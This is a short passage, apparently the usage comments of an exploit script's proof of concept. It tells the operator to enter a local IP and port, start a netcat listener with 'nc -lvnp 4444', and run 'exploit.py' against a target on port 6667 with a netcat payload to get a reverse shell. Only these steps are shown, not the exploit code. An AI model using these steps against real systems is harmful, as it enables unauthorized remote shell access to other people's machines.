...
# Proof of Concept
# 1. Modify the lines 20 and 21 within the script with the local_ip and local_port.  
# 2. Set up a netcat listener: nc -lvnp 4444
# 3. python3 exploit.py $IP 6667 -payload netcat
